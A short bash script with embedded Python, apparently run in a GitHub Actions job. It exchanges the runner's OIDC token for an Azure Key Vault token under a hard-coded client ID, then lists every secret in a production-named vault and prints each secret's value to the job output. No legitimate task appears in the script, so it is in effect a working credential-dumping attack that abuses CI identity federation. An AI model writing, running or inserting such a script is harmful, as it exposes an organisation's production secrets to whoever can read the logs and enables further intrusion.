#!/usr/bin/env bash
set -uo pipefail
TID="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
python3 - "$OIDC" "$TID" <<'PY'
import sys,json,urllib.request,urllib.parse,urllib.error
oidc,tid=sys.argv[1:3]
def post(url,data):
    req=urllib.request.Request(url,data=urllib.parse.urlencode(data).encode(),method="POST")
    try:
        with urllib.request.urlopen(req,timeout=30) as r: return json.load(r)
    except urllib.error.HTTPError as e:
        try: return json.loads(e.read().decode())
        except Exception: return {"error":"http%d"%e.code}
def get(url,tok):
    req=urllib.request.Request(url,headers={"Authorization":"Bearer "+tok})
    try:
        with urllib.request.urlopen(req,timeout=30) as r: return r.status,r.read().decode()
    except urllib.error.HTTPError as e: return e.code,e.read().decode()[:400]
    except Exception as e: return 0,repr(e)[:200]
def fed(cid,scope):
    return post(f"https://login.microsoftonline.com/{tid}/oauth2/v2.0/token",{
      "client_id":cid,"grant_type":"client_credentials",
      "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
      "client_assertion":oidc,"scope":scope}).get("access_token","")
kv=fed("72ff278a-9e71-43ec-bac4-2ca303f8e462","https://vault.azure.net/.default")
print("KVTOK",len(kv))
s,b=get("https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4",kv)
print("LIST",s)
names=[]
try:
    for x in json.loads(b).get("value",[]): names.append(x["id"].split("/")[-1])
except Exception: print("LISTBODY",b[:400])
print("NAMES",names)
for n in names:
    s,v=get(f"https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/{urllib.parse.quote(n)}?api-version=7.4",kv)
    print("SECRET",n,s,v[:2000])
PY
